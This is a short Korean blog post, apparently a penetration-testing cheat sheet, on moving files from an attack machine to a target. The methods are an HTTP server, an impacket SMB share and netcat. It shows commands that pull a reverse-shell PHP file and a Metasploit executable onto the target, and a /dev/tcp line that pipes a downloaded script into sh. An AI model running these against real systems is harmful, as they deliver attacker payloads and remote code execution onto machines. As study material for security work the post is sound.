---
layout: post
title: 파일 전송하는 방법
subtitle: 타겟, 어택 머신 사이에서 파일 전송하기
category: knowledge
thumbnail-img: /assets/img/hazard.jpg
tags: [knowledge, smb-server, nc, 파일전송,filetransfer]
author: Hong
---

어택 머신에 파일을 옮겨야 할 때, 한가지 방법만으로는 실패할 때가 있다.

그럴때를 대비한 여러가지 파일 전송 방법이 있다.

# web 서버
가장 간단한 웹서버를 이용하는 방법.


어택머신 `python3 -m http.server 80`

타겟머신 `wget http://<attack_IP>/revshell.php`

# SMB 서버
공격머신을 smb 서버로 이용.

어택머신 `impacket-smbserver test . -smb2support`

위의 경우 폴더 이름을 test로 설정 후, 디렉토리를 현재 디렉토리로 설정한다.

경우에 따라서는 `-smb2support`를 추가해야 문제없이 연결된다.

어택머신에서 파일을 복사.

`PS C:\Users\Mike> copy \\192.168.45.159\test\msf.exe ./msf.exe`

# nc 이용

어택머신에서 타겟머신으로 보내는 경우
```bash
sudo nc -q 5 -lvnp 80 < linpeas.sh # 어택머신
cat < /dev/tcp/10.10.10.10/80 | sh # 타겟머신
```

타겟머신으로 대기 후, 어택머신에서 전송.
```cmd
$ nc -l -p 1234 > received_file  # 타겟머신
$ nc -q 0 client_IP 1234 < file_to_send # 어택머신 
```
-q 0을 해야 전송이 끝나면 연결이 종료됨. 안하면 계속 연결한채로 남는다.
